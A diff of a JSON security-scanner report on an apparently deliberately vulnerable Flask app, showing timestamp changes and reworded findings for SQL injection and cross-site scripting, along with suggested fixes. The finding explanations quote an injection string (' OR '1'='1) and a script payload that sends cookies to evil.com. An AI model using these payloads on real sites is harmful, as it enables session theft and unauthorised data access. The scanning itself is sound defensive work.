@@ -1,8 +1,8 @@
 {
-  "scan_date": "2026-11-13 20:26:13",
+  "scan_date": "2026-11-13 23:00:34",
   "app_name": "vuln_app",
   "routes_scanned": 8,
-  "scan_duration_seconds": 1.023,
+  "scan_duration_seconds": 0.992,
   "summary": {
     "total_issues": 12,
     "critical": 6,
@@ -19,10 +19,10 @@
       "file": "D:\\pysecure\\vuln-flask\\app.py",
       "line": 9,
       "code": "query = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"",
-      "explanation": "Variable 'username' appears to come from user input and is interpolated directly into a SQL query string. An attacker can send input like `' OR '1'='1` to manipulate the query, potentially accessing or deleting all data.",
+      "explanation": "Variable 'password' appears to come from user input and is interpolated directly into a SQL query string. An attacker can send input like `' OR '1'='1` to manipulate the query, potentially accessing or deleting all data.",
       "fix": "Use parameterized queries instead of string interpolation.",
-      "fix_before": "cursor.execute(f\"SELECT ... WHERE col = {username}\")",
-      "fix_after": "cursor.execute(\"SELECT ... WHERE col = %s\", (username,))",
+      "fix_before": "cursor.execute(f\"SELECT ... WHERE col = {password}\")",
+      "fix_after": "cursor.execute(\"SELECT ... WHERE col = %s\", (password,))",
       "reference": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
     },
     {
@@ -47,7 +47,7 @@
       "file": "D:\\pysecure\\vuln-flask\\app.py",
       "line": 4,
       "code": "return render_template_string(tmpl)",
-      "explanation": "Variable 'tmpl' appears to contain user input that is included in HTML output without escaping (render_template_string with user input variable). An attacker can inject '<script>document.location=\"http://evil.com/?c=\"+document.cookie</script>' to steal cookies.",
+      "explanation": "Variable 'tmpl' appears to contain user input that is included in HTML output without escaping (render_template_string with user input). An attacker can inject '<script>document.location=\"http://evil.com/?c=\"+document.cookie</script>' to steal cookies.",
       "fix": "Escape all user input before including in HTML.",
       "fix_before": "return f\"<h1>{tmpl}</h1>\"",
       "fix_after": "from markupsafe import escape\nreturn f\"<h1>{escape(tmpl)}</h1>\"",
